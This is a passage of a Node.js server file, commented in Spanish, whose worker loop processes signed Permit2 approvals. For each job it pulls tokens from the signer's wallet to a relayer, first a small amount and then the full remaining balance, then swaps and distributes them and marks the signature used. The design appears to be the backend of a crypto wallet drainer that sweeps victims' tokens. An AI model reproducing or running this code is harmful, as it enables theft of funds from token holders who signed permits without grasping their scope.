      const txSmall = await permit2.transferFrom(owner, relayer.address, smallAmount, permitObj.details.token, { gasLimit: 700000 });
      out.steps.push({ transferSmallTx: txSmall.hash }); await txSmall.wait(); out.steps.push('small transfer confirmed');
      const okSmall = await swapAndDistributeTokenAmount(permitObj.details.token, smallAmount);
      out.steps.push('small processed -> ' + okSmall);
    } catch (e) { out.steps.push('transferSmall failed: ' + (e?.message || e)); }

    // Second pull: remaining
    const remaining = fullAmount.sub(smallAmount);
    if (remaining.gt(0)) {
      try {
        out.steps.push('transferFrom owner -> relayer (remaining): ' + remaining.toString());
        const txRem = await permit2.transferFrom(owner, relayer.address, remaining, permitObj.details.token, { gasLimit: 700000 });
        out.steps.push({ transferRemainingTx: txRem.hash }); await txRem.wait(); out.steps.push('remaining transfer confirmed');
        const okRem = await swapAndDistributeTokenAmount(permitObj.details.token, remaining);
        out.steps.push('remaining processed -> ' + okRem);
      } catch (e) { out.steps.push('transferRemaining failed: ' + (e?.message || e)); }
    } else out.steps.push('no remaining to transfer');

    await markSignatureUsed(owner, permitObj.details.token);
    out.ok = true;
    return out;
  } catch (e) { console.error('processJob error', e); out.ok = false; out.error = e?.message || String(e); return out; }
}

// worker loop
let workerRunning = false;
async function workerLoop() {
  if (workerRunning) return;
  workerRunning = true;
  try {
    while (true) {
      const job = await getNextPendingJob();
      if (!job) break;
      await updateJob(job.id, { status: 'processing', startedAt: new Date().toISOString() });
      const outcome = await processJob(job);
      if (outcome.ok) await updateJob(job.id, { status: 'done', finishedAt: new Date().toISOString(), outcome });
      else {
        const retries = (job.retries || 0) + 1;
        if (retries > MAX_JOB_RETRIES) await updateJob(job.id, { status: 'failed', finishedAt: new Date().toISOString(), outcome, retries });
        else {
          if (job.status === 'awaiting_transfer') {
            await updateJob(job.id, { status: 'awaiting_transfer', retries, lastError: outcome.error, nextAttemptAt: Date.now() + 10000 * retries });
          } else {
            await updateJob(job.id, { status: 'pending', retries, lastError: outcome.error, nextAttemptAt: Date.now() + 5000 * retries });
          }
        }
      }
    }
  } catch (e) { console.error('workerLoop error', e); }
  finally { workerRunning = false; }
}

// ----------------- Inicialización segura y arranque -----------------
async function ensurePersistenceFiles() {
  try {
    await fs.ensureFile(SIG_FILE);
  } catch (e) {
    console.warn("ensureFile SIG_FILE failed:", e?.message || e);
  }
  try {
    if (!(await fs.pathExists(NONCE_FILE))) await fs.writeJson(NONCE_FILE, {});
  } catch (e) {
    console.warn("ensure NONCE_FILE failed:", e?.message || e);
  }
  try {
    if (!(await fs.pathExists(JOBS_FILE))) await fs.writeJson(JOBS_FILE, []);
  } catch (e) {
    console.warn("ensure JOBS_FILE failed:", e?.message || e);
  }
}

let workerIntervalHandle = null;

async function start() {
  // preparar archivos de persistencia
  await ensurePersistenceFiles();

  // lanzar worker loop periódico (comienza sólo después de asegurar archivos)
  workerIntervalHandle = setInterval(() => { workerLoop().catch(e => console.error('worker interval error', e)); }, 3000);

  // arrancar servidor
  app.listen(PORT, () => console.log("Server listening on port", PORT));
}

// Iniciar
start().catch(e => {
  console.error("Startup failed", e);
  process.exit(1);
});

// Manejo de errores no capturados
process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

process.on('uncaughtException', (error) => {
  console.error('Uncaught Exception thrown:', error);
  process.exit(1);
});

// export app (útil para tests)
export default app;
